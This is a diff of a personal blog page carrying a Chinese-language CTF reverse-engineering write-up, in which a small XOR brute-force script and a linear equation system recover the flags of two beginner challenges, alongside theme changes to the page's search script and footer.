-        <h1 id="RE">
-          <a href="#RE" class="heading-link"><i class="fas fa-link"></i></a>RE</h1>
-      
-        <h2 id="逆向签到">
-          <a href="#逆向签到" class="heading-link"><i class="fas fa-link"></i></a>逆向签到</h2>
-      <p>直接丢进IDA查看，查看伪代码：</p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="逆向签到"><a href="#逆向签到" class="headerlink" title="逆向签到"></a>逆向签到</h2><p>直接丢进IDA查看，查看伪代码：</p>
 <p><img src="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png" alt></p>
 <p>可以看到这些变量占用了4个字节来存储。</p>
 <p><img src="https://i.loli.net/2019/01/28/5c4f1ade58965.png" alt></p>
 <p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p>
 <p><img src="https://i.loli.net/2019/01/28/5c4f1c7412770.png" alt></p>
 <p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
 <p>运行结果：</p>
 <p><img src="https://i.loli.net/2019/01/28/5c4f1a3be6535.png" alt></p>
-
-        <h2 id="Eazy-Math">
-          <a href="#Eazy-Math" class="heading-link"><i class="fas fa-link"></i></a>Eazy_Math</h2>
-      <p>同样的，还是丢进IDA中查看伪代码：</p>
+<h2 id="Eazy-Math"><a href="#Eazy-Math" class="headerlink" title="Eazy_Math"></a>Eazy_Math</h2><p>同样的，还是丢进IDA中查看伪代码：</p>
 <p><img src="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png" alt></p>
 <p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p>
 <p>首先查看String2Int函数：</p>
@@ -290,244 +254,76 @@ G+2H+I=380 \\
 2G+H+I=421 \\
 G+H+2I=427 \\
 \end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2019/01/30/cumtctf2/">http://chaosec.top/2019/01/30/cumtctf2/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/CTF/">CTF</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/03/02/xss20/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">XSS20冲关之旅</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/01/30/hgame2019/"><span class="paginator-prev__text">HGAME2019-Web-Week1&amp;2</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,165,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+      
+    </div>
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
-        };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
+  </div>
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/writeup/">writeup</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
         }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ Untitled ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
-
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
-
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
-
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
-
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
-                    }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
-
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
-
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
-                });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
-
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
-
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
-
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
-
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
-            }
-          });
-        }
-
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
-        } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
-        }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
-    }
-  });
-}
-
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
-
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
-
-      initSearch();
     });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
     });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
-
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
